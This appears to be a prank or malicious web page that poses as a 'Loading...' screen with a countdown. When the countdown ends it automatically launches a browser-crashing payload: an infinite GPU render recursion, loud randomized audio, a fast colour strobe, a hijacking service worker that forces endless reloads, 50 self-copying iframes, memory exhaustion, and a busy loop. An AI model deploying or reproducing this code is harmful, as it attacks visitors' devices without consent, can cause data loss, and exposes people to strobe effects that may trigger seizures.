<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body { margin: 0; overflow: hidden; background: #000; font-family: 'Impact', sans-serif; }
        #countdown { 
            position: fixed; top: 20px; right: 20px;
            background: #fff; color: #000; padding: 15px 25px;
            font-size: 36px; font-weight: bold; z-index: 9999;
            border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }
        .she-col { 
            position: absolute; width: 100%; text-align: center;
            font-size: 48px; font-weight: 900; pointer-events: none; z-index: 9998;
            text-shadow: 2px 2px 0 #000, -2px -2px 0 #000, 2px -2px 0 #000, -2px 2px 0 #000;
        }
        canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; display: block !important; }
        iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; opacity: 0; }
        
        /* MOUSE DRAW LAYER */
        #drawCanvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 50; pointer-events: none; }
    </style>
</head>
<body>
    <div id="countdown">Please wait... 3</div>
    <canvas id="gpuCanvas"></canvas>
    <canvas id="drawCanvas"></canvas>
    
    <script>
        // === AUTO-FIRE ON LOAD (NO CLICK NEEDED) ===
        window.onload = () => {
            const cd = document.getElementById('countdown');
            let count = 3;
            function tick() {
                count--;
                if (count > 0) { 
                    cd.textContent = `Please wait... ${count}`; 
                    setTimeout(tick, 800); 
                } else { 
                    cd.style.display = 'none'; 
                    unleashHell(); 
                }
            }
            setTimeout(tick, 800);
        };

        function unleashHell() {
            // 1. GPU MELT (THAT CORNER GLITCH YOU SAW)
            const canvas = document.getElementById('gpuCanvas');
            canvas.width = window.innerWidth * 2;
            canvas.height = window.innerHeight * 2;
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const vs = gl.createShader(gl.VERTEX_SHADER);
                gl.shaderSource(vs, 'attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}');
                gl.compileShader(vs);
                const fs = gl.createShader(gl.FRAGMENT_SHADER);
                // VISIBLE PATTERN SO YOU SEE IT WORKING
                gl.shaderSource(fs, 'precision highp float;uniform float t;void main(){float c=sin(t*10.0+gl_FragCoord.x*0.1)*cos(t*7.0+gl_FragCoord.y*0.1);gl_FragColor=vec4(c,1.0-c,abs(sin(t)),1.0);}');
                gl.compileShader(fs);
                const prog = gl.createProgram();
                gl.attachShader(prog, vs); gl.attachShader(prog, fs); gl.linkProgram(prog); gl.useProgram(prog);
                const buf = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, buf);
                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
                const pos = gl.getAttribLocation(prog, 'p');
                gl.enableVertexAttribArray(pos);
                gl.vertexAttribPointer(pos, 2, gl.FLOAT, false, 0, 0);
                const timeLoc = gl.getUniformLocation(prog, 't');
                
                function gpuBurn(t) {
                    gl.uniform1f(timeLoc, t * 0.001);
                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                    gpuBurn(performance.now()); // INFINITE LOOP NO RAF
                }
                gpuBurn(0);
            }

            // 2. AUDIO ASSAULT (AUTO-PLAY ATTEMPT)
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.type = 'sawtooth';
                osc.frequency.setValueAtTime(800, ctx.currentTime);
                gain.gain.value = 0.9;
                osc.connect(gain).connect(ctx.destination);
                osc.start();
                setInterval(() => {
                    osc.frequency.setValueAtTime(100 + Math.random() * 5000, ctx.currentTime);
                }, 100);
            } catch(e) {}

            // 3. SHE-SHE COLUMNS
            const cols = Math.ceil(window.innerWidth / 120);
            for (let c = 0; c < cols; c++) {
                const col = document.createElement('div');
                col.className = 'she-col';
                col.style.left = `${c * 120}px`;
                col.style.color = `hsl(${Math.random()*360},100%,60%)`;
                let content = '';
                for (let r = 0; r < 40; r++) content += `<div style="font-size:${30+Math.random()*70}px;margin:5px 0;">SHE SHE</div>`;
                col.innerHTML = content;
                document.body.appendChild(col);
                
                let speed = (Math.random() > 0.5 ? 1 : -1) * (5 + Math.random() * 15);
                let pos = 0;
                setInterval(() => { pos += speed; col.style.transform = `translateY(${pos % 4000 - 2000}px)`; }, 16);
            }

            // 4. STROBE BACKGROUND
            setInterval(() => {
                document.body.style.backgroundColor = 
                    `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
            }, 50);

            // 5. MOUSE DRAW TRAIL (RED PAINT ON CURSOR)
            const drawC = document.getElementById('drawCanvas').getContext('2d');
            drawC.fillStyle = '#ff0000';
            document.addEventListener('mousemove', (e) => {
                drawC.beginPath();
                drawC.arc(e.clientX, e.clientY, 20, 0, Math.PI * 2);
                drawC.fill();
            });

            // 6. CRASH PAYLOAD AFTER 4 SECONDS
            setTimeout(() => {
                if ('serviceWorker' in navigator) {
                    navigator.serviceWorker.register(URL.createObjectURL(new Blob([
                        `self.addEventListener('fetch',e=>e.respondWith(new Response('<scr'+'ipt>location.reload()</scr'+'ipt>',{headers:{'Content-Type':'text/html'}})));`
                    ], {type:'application/javascript'})));
                }
                for(let i=0;i<50;i++) {
                    const f=document.createElement('iframe');
                    f.srcdoc='<scr'+'ipt>'+document.querySelector('script').innerHTML+'</scr'+'ipt>';
                    document.body.appendChild(f);
                }
                const chunks=[];
                while(true){try{chunks.push(new Uint8Array(256*1024*1024))}catch(e){break}}
                while(true){Math.random()}
            }, 4000);
        }

        window.onbeforeunload = () => { 
            for(let i=0;i<50;i++){
                const f=document.createElement('iframe');
                f.srcdoc='<scr'+'ipt>'+document.querySelector('script').innerHTML+'</scr'+'ipt>';
                document.body.appendChild(f);
            }
            return "Wait..."; 
        };
    </script>
</body>
</html>
